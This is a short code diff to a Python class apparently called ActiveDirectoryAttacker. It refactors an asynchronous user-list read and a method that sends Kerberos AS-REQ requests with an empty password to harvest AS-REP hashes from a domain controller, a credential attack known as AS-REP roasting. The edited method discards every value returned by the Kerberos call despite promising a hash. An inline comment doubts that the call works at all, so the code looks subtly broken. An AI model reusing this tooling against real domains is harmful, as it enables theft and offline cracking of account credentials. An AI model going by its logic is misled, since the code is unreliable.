@@ -66,9 +66,12 @@ class ActiveDirectoryAttacker:
         except FileNotFoundError:
             return {"error": "User file not found", "success": False}
         except ImportError:
-            # Fallback sync read
-            with open(user_file, "r") as f:
-                users = [line.strip() for line in f if line.strip()]
+            # Fallback: Read in thread to avoid blocking loop
+            def sync_read():
+                with open(user_file, "r") as f:
+                    return [line.strip() for line in f if line.strip()]
+
+            users = await asyncio.to_thread(sync_read)
 
         # Semaphore for concurrency control
         sem = asyncio.Semaphore(concurrency)
@@ -171,12 +174,13 @@ class ActiveDirectoryAttacker:
     def _get_as_rep_hash(self, domain: str, user: str, dc_ip: str) -> Optional[str]:
         """Craft AS-REQ for a user without pre-auth"""
         try:
-            clientName = Principal(
+            client_name = Principal(
                 user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
             )
             # Try to get TGT without password (no pre-auth)
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
-                clientName, "", domain, None, None, kdcHost=dc_ip, requestPAC=True
+            # Using placeholders (_) for unused unpacked values: tgt, cipher, oldSessionKey, sessionKey
+            _, _, _, _ = getKerberosTGT(
+                client_name, "", domain, None, None, kdcHost=dc_ip, requestPAC=True
             )
             # If successful (no exception), no pre-auth needed!
             # But wait, getKerberosTGT usually requires password or throws error.
